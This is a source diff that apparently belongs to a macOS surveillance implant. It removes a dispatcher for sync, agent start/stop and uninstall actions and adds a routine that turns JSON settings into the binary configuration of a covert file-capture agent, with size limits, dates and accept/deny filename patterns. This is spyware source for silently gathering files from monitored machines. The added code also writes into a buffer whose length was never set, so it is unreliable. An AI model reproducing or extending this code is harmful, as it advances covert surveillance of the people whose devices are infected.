@@ -44,161 +44,137 @@
   [super dealloc];
 }
 
-// will be inserted in taskmanager category... move it there after impls
-- (BOOL)triggerAction: (int)anAction
-{
-#ifdef DEBUG
-  NSLog(@"Triggering Action: %d", anAction);
-#endif
-  
-  NSDictionary *action = (NSDictionary *)[mActionsList objectAtIndex: anAction];
-  
-  if (action == nil)
-    {
-#ifdef DEBUG_JSON_CONFIG
-    NSLog(@"%s: no action dictionary", __FUNCTION__);
-#endif    
-    return NO;
-    }
-  
-#ifdef DEBUG_JSON_CONFIG
-  NSLog(@"%s: action dictionary %@", __FUNCTION__, action);
-#endif
-  
-  NSArray *subactArray = (NSArray *)[action objectForKey: ACTION_SUBACT_KEY];
-  
-  for (int subAct=0; subAct < [subactArray count]; subAct++) 
-    {  
-      //    switch ([[configuration objectForKey: @"type"] intValue])
-      //    {
-      //#if 0
-      //      case ACTION_SYNC_APN:
-      //      {
-      //#ifdef DEBUG_JSON_CONFIG
-      //        NSLog(@"Starting action Sync APN");
-      //#endif
-      //        
-      //        if ([[configuration objectForKey: @"status"] intValue] == 0)
-      //        {
-      //          if (gAgentCrisis == NO) 
-      //          {
-      //#ifdef DEBUG_JSON_CONFIG
-      //            NSLog(@"%s: crisis agent not active sync!", __FUNCTION__);
-      //#endif
-      //            NSNumber *status = [NSNumber numberWithUnsignedInt: 1];
-      //            [configuration setObject: status forKey: @"status"];
-      //            
-      //            [mActions actionSyncAPN: configuration];
-      //          }
-      //          else 
-      //          {
-      //#ifdef DEBUG_JSON_CONFIG
-      //            NSLog(@"%s: crisis agent active don't sync!", __FUNCTION__);
-      //#endif
-      //          }
-      //        }
-      //        break;
-      //      }
-      //#endif
-      //      case ACTION_SYNC:
-      //      {
-      //#ifdef DEBUG_JSON_CONFIG
-      //        NSLog(@"Starting action Sync");
-      //#endif
-      //        
-      //        if ([[configuration objectForKey: @"status"] intValue] == 0)
-      //        {
-      //          if (gAgentCrisis == NO) 
-      //          {
-      //#ifdef DEBUG_JSON_CONFIG
-      //            NSLog(@"%s: crisis agent not active sync!", __FUNCTION__);
-      //#endif
-      //            NSNumber *status = [NSNumber numberWithUnsignedInt: 1];
-      //            [configuration setObject: status forKey: @"status"];
-      //            
-      //            [mActions actionSync: configuration];
-      //          }
-      //          else 
-      //          {
-      //#ifdef DEBUG_JSON_CONFIG
-      //            NSLog(@"%s: crisis agent active don't sync!", __FUNCTION__);
-      //#endif
-      //          }
-      //        }
-      //        break;
-      //      }
-      //      case ACTION_AGENT_START:
-      //      {
-      //        // Maybe call directly startAgent form TaskManager here instead of passing
-      //        // through RCSMActions
-      //        
-      //        if ([[configuration objectForKey: @"status"] intValue] == 0)
-      //        {
-      //#ifdef DEBUG_JSON_CONFIG
-      //          NSLog(@"AGENT START");
-      //#endif
-      //          
-      //          NSNumber *status = [NSNumber numberWithUnsignedInt: 1];
-      //          [configuration setObject: status forKey: @"status"];
-      //          
-      //          [mActions actionAgent: configuration start: TRUE];
-      //        }
-      //        
-      //        break;
-      //      }
-      //      case ACTION_AGENT_STOP:
-      //      {
-      //        if ([[configuration objectForKey: @"status"] intValue] == 0)
-      //        {
-      //          NSNumber *status = [NSNumber numberWithUnsignedInt: 1];
-      //          [configuration setObject: status forKey: @"status"];
-      //          
-      //          [mActions actionAgent: configuration start: FALSE];
-      //        }
-      //        
-      //        break;
-      //      }
-      //      case ACTION_UNINSTALL:
-      //      {
-      //        if ([[configuration objectForKey: @"status"] intValue] == 0)
-      //        {
-      //          NSNumber *status = [NSNumber numberWithUnsignedInt: 1];
-      //          [configuration setObject: status forKey: @"status"];
-      //          
-      //          [mActions actionUninstall: configuration];
-      //        }
-      //        
-      //        break;
-      //      }
-      //      case ACTION_INFO:
-      //      {
-      //#ifdef DEBUG_JSON_CONFIG
-      //        NSLog(@"Starting info action");
-      //#endif
-      //        if ([[configuration objectForKey: @"status"] intValue] == 0)
-      //        {
-      //          NSNumber *status = [NSNumber numberWithUnsignedInt: 1];
-      //          [configuration setObject: status forKey: @"status"];
-      //          
-      //          [mActions actionInfo: configuration];
-      //          status = [NSNumber numberWithUnsignedInt: 0];
-      //          [configuration setObject: status forKey: @"status"];
-      //        }
-      //        
-      //        break;
-      //      }
-      //      default:
-      //        return FALSE;
-      //    }
-    }
-  return TRUE;
-}
-
 #
 #
 #pragma mark Modules parsing
 #
 #
+typedef struct _fileConfiguration {
+  u_int minFileSize;
+  u_int maxFileSize;
+  u_int hiMinDate;
+  u_int loMinDate;
+  u_int reserved1;
+  u_int reserved2;
+  u_int noFileOpen;
+  u_int acceptCount;
+  u_int denyCount;
+  char patterns[1]; // wchar_t
+} file_t;
+
+- (void)initFileModule: (NSDictionary *)aModule
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  file_t file;
+  int64_t winDate;
+  id enabled = AGENT_ENABLED;
+  NSArray *keys = nil;
+  NSArray *objects = nil;  
+  NSData *dataNull = [NSData dataWithBytes: "\x00\x00" length:2];
+  
+  NSNumber *type = [NSNumber numberWithUnsignedInt: AGENT_FILECAPTURE];
+  NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
+  
+  NSNumber *capture = [aModule objectForKey:@"capture"];
+  NSNumber *open    = [aModule objectForKey:@"open"];
+  NSNumber *minsize = [aModule objectForKey:@"minsize"];
+  NSNumber *maxsize = [aModule objectForKey:@"maxsize"];
+  NSString *date    = [aModule objectForKey:@"date"];
+  NSArray  *accept  = [aModule objectForKey:@"accept"];
+  NSArray  *deny    = [aModule objectForKey:@"deny"];
+  
+  if (status == nil || [status boolValue] == FALSE)
+    enabled = AGENT_DISABLED;
+    
+  file.maxFileSize = (maxsize != nil ? [maxsize intValue] : 500000);
+  file.noFileOpen  = (open    != nil ? [open boolValue] : TRUE);
+  
+  if (capture != nil && [capture boolValue] == TRUE)
+    {
+      file.minFileSize = (minsize != nil ? [minsize intValue] : 1);
+    }
+  else
+    {
+      // file capt flag is off: disable capture by reset minFileSize
+      // (see RCSMAgentFileCapture.m : 88
+      file.minFileSize = 0;
+    }
+  
+  winDate = [self calculateWinDate: (date != nil ? date : @"1970-01-01 00:00:00")];
+  
+  file.loMinDate = winDate & 0xFFFFFFFF;
+  file.hiMinDate = (winDate >> 32) & 0xFFFFFFFF;
+  
+  file.acceptCount = (accept != nil ? [accept count] : 0) ; 
+  file.denyCount   = (deny   != nil ? [deny count] : 0);
+  
+  // fill the string array
+  NSMutableData *acceptStrings = [[NSMutableData alloc] initWithLength: 0];
+  
+  for (int i=0; i < file.acceptCount; i++) 
+    {
+      NSString *tmpStr  = [accept objectAtIndex:i];
+      NSData   *dataStr = [tmpStr dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
+      
+      [acceptStrings appendData:dataStr];
+      [acceptStrings appendData:dataNull]; 
+    }
+  
+  NSMutableData *denyStrings = [[NSMutableData alloc] initWithLength: 0];
+      
+  for (int i=0; i < file.denyCount; i++) 
+    {
+      NSString *tmpStr  = [deny objectAtIndex:i];
+      NSData   *dataStr = [tmpStr dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
+    
+      [denyStrings appendData:dataStr];
+      [denyStrings appendData:dataNull]; 
+    }
+  
+  
+  NSMutableData *data = [[NSMutableData alloc] initWithCapacity:(sizeof(file_t) - sizeof(char*)) + 
+                                                                [acceptStrings length] + 
+                                                                [denyStrings length]];
+  char *dataBuff = (char*)[data bytes];
+  
+  // struct - patterns
+  memcpy(dataBuff, &file, (sizeof(file_t) - sizeof(char*)));
+  dataBuff += (sizeof(file_t) - sizeof(char*));     
+  
+  memcpy(dataBuff, [acceptStrings bytes], [acceptStrings length]);
+  dataBuff += [acceptStrings length];
+  
+  memcpy(dataBuff, [denyStrings bytes], [denyStrings length]);
+                                                                                                                                                                      
+  [acceptStrings release];
+  [denyStrings release];
+  
+  keys = [NSArray arrayWithObjects: @"agentID",
+                                    @"status",
+                                    @"data",
+                                    nil];
+  
+  objects = [NSArray arrayWithObjects: type, 
+                                       enabled, 
+                                       data,
+                                       nil];
+  
+  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
+                                                         forKeys: keys];
+  
+  [data release];
+  
+  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
+  
+  [moduleConfiguration addEntriesFromDictionary: dictionary];
+  
+  [mAgentsList addObject: moduleConfiguration];
+  
+  [moduleConfiguration release];
+  
+  [pool release];
+}
 
 // Done.
 - (void)initABModule: (NSDictionary *)aModule
